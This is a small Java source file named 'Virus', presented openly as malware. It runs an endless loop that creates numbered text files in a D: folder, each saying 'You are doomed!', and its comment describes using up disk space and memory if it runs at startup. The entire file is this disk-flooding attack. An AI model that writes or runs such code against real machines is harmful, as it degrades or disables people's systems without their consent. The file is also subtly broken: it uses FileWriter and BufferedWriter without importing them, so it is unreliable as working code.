import java.io.File;
import java.io.IOException;

/**
 * Created by Ruby on 3/21/2016.
 */
//A Virus that floods a folder by creating new files. Some amount of your RAM will keep being used and some amount of your space being consumed if this is run during system startup!
public class Virus {
    public static void main(String[] args) {
        createFile();
    }

    static void createFile(){
        int val=0;
        while (true){
            String fname="D:\\this\\file"+ val + ".txt";
			
            val++;
            File f=new File(fname);
            try{
                f.createNewFile();
				FileWriter fw = new FileWriter(f.getAbsoluteFile());
				BufferedWriter bw = new BufferedWriter(fw);
				bw.write("You are doomed!");
				bw.close();
            }catch(IOException e){
                e.printStackTrace();
            }

        }

    }
}
